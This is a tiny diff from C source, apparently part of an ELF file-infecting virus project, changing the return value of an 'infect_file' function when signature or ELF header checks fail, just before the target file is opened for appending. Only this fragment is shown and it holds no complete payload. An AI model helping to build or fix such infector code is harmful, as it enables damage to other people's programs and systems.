@@ -27,7 +27,7 @@ int	infect_file(t_exec_ctx *ctx, const char *path)
 {
 	if (check_signature(path) == -1
 		|| check_elf_hdr(path) == -1)
-		return (-1);
+		return (0);
 
 	int	fd = open(path, O_WRONLY | O_APPEND);
 	if (fd == -1)
